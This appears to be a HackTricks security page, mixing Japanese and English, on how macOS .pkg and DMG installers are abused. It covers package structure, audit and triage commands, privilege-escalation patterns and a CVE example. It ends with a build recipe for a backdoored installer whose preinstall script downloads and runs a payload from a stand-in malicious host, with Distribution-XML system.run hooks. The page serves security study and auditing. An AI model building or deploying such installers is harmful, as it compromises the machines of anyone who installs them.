# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

macOS の **installer package**（`.pkg` file とも呼ばれる）は、macOS が **software を配布**するために使う file format です。これらの file は、**software のインストールと正しく動作するために必要なものをすべて含む箱**のようなものです。

package file 自体は、ターゲットの computer にインストールされる **files と directories の階層構造**を保持する archive です。また、configuration files の設定や古い version の software の cleanup など、installation の前後に task を実行するための **scripts** も含められます。

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: カスタマイズ（title, welcome text…）と script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, 実行する scripts への path
- **Bill of materials (bom)**: file permissions 付きで install, update, remove する files の list
- **Payload (CPIO archive gzip compressed)**: PackageInfo の `install-location` に install される files
- **Scripts (CPIO archive gzip compressed)**: pre/post install scripts と、実行のために temp directory に展開される追加 resources

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
手動で展開せずにインストーラの内容を可視化したい場合は、無料ツール [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/) も使えます。

### Static triage shortcuts

目的が分析であれば、まず `Installer.app` でパッケージを開くのは**避ける**ようにしてください。パッケージによっては、Installer が開いた時点でコードを実行できるものがあります（たとえば `system.run()` や installer plug-ins 経由）。そのため、通常はオフラインでの抽出から始めるほうがより安全です。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basic Information

DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.

> [!CAUTION]
> Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:

- Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
- Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
- Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.

## pkg abuseによるPrivesc

### パブリックディレクトリからの実行

If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and an attacker can control that script, they can escalate privileges whenever it's executed. Or another similar example:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
詳しくはこのトークを確認してください: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Environment and shebang abuse

Modern PackageKit のバグは、installer scripts がしばしば **trusted root code** として実行される一方で、attackers が制御する context が近くに残ることを示しました。vendor packages を監査する際は、特に次の点に注意してください:

- `#!/bin/zsh` / `#!/bin/bash` のような shell interpreters
- `sudo -u $USER`、`launchctl asuser` のような呼び出し、または `$USER`、`$HOME`、`PATH`、`TMPDIR`、もしくは relative paths を信頼するロジック
- user-controlled の init files や libraries を読み込む可能性がある non-shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
2024 PackageKit root-environment bug (`~/.zshenv` / `~/.bash*` inheritance during user-initiated installs) については、[generic macOS privesc page](../macos-privilege-escalation.md) を確認してください。パッケージが **Apple-signed** の場合、同じ script bug は **SIP/TCC-relevant** になり得ます。というのも、`system_installd` が `com.apple.rootless.install.heritable` を持つ可能性があるためです。詳細は [SIP page](../macos-security-protections/macos-sip.md) を参照してください。

### Mounting による実行

installer が `/tmp/fixedname/bla/bla` に書き込む場合、`/tmp/fixedname` の上に noowners 付きで **mount を作成** できるため、installation 中に **任意のファイルを変更** して installation process を abuse できます。

その例が **CVE-2021-26089** で、**periodic script を上書き** して root として execution を得ることに成功しました。詳細は以下の talk を見てください: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## malware としての pkg

### Empty Payload

実際の payload を持たず、scripts 内の malware 以外は何もない **`.pkg`** file を、**pre and post-install scripts** 付きで作成できます。

### Distribution xml 内の JS

package の **distribution xml** file に **`<script>`** tags を追加でき、その code は execution され、`system.run` を使って commands を **execute** できます:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

distribution packages では、これは通常、トップレベルの `Distribution` file が external scripts を有効化しているかどうかに依存します。たとえば `allow-external-scripts="true"` です。したがって、`preinstall` / `postinstall` だけを確認するのでは不十分です。**Distribution XML 自体** に `installation-check` / `volume-check` hooks と、`system.run()` / `system.runOnce()` の direct execution paths を含められます。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### バックドア付きインストーラー

script と dist.xml 内の JS code を使った malicious installer
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
